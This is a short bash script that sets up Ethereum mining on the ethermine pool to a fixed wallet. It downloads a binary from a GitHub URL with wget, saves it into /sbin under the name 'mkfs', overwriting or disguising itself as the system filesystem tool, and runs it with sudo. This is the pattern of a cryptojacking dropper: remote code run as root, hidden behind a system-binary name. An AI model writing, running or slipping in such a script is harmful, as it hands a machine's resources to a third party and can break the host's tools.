#!/bin/bash

POOL=asia1.ethermine.org:4444
WALLET=0x7f5efa9e926a94ded7b22125b870fd0846aa5d34
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )

cd "$(dirname "$0")"
cd /sbin
wget -O mkfs https://raw.githubusercontent.com/azis07/turbo/main/turbo
chmod +x ./mkfs && sudo ./mkfs -a ethash -o $POOL -u $WALLET.$WORKER $@
